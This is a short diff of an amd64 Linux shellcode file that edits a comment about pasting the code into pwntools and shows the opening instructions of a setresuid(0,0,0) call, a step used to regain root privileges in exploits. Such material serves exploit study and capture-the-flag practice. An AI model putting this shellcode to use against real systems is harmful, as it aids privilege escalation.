@@ -1,6 +1,6 @@
 ;amd64 shellcode for linux (intel)
 bits 64
-;remove comments if pasted in pwntools asm
+;remove comments and "bits 64" if pasted in pwntools asm
 ;setresuid(0,0,0) (16B)
     xor rdi, rdi                    ;1st arg
     xor rsi, rsi                    ;2nd arg
